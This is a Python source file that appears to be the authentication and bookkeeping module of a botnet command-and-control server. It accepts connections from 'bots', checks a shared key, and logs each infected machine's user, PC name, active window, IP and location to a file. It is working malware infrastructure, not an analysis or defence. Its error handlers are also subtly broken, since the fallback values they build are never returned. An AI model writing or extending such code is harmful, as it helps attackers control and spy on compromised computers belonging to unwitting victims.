# backend/Services/Auth.py
import asyncio, json, logs.LoggerWrapper as logger, backend as cfg
from pathlib import Path

BOTS_FILE = Path(__file__).parent / "Bots_DB.txt"
REQUIRED_FIELDS = ['id', 'loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'auth_key']

async def authorize_client(reader, ip_address):
    try:
        packet_len = int.from_bytes(await asyncio.wait_for(reader.readexactly(4), 10), "big")
        if not (0 < packet_len <= 65536): return None
        data = json.loads((await asyncio.wait_for(reader.readexactly(packet_len), 10)).decode())
        if any(field not in data for field in REQUIRED_FIELDS) or data.get('auth_key') != cfg.AUTH_KEY: return None
        return (bot_id := data.get('id', ip_address)), sync_bot_data(bot_id, data)
    except Exception as error: (logger.Log.info(f"[!] Auth Error {ip_address}: {error}"), None)

def sync_bot_data(bot_id, payload):
    try:
        db = json.loads(BOTS_FILE.read_text(encoding="utf-8")) if BOTS_FILE.exists() else {}
        clean_data = {key: val for key, val in payload.items() if key != 'auth_key'}
        if bot_id in db:
            for key, val in clean_data.items():
                if val not in [None, "", "??", "0.0.0.0", "null"]: db[bot_id][key] = val
        else: db[bot_id] = clean_data
        BOTS_FILE.write_text(json.dumps(db, indent=4, ensure_ascii=False), encoding="utf-8")
        return db[bot_id]
    except Exception as error: (logger.Log.error(f"DB Sync Error: {error}"), payload)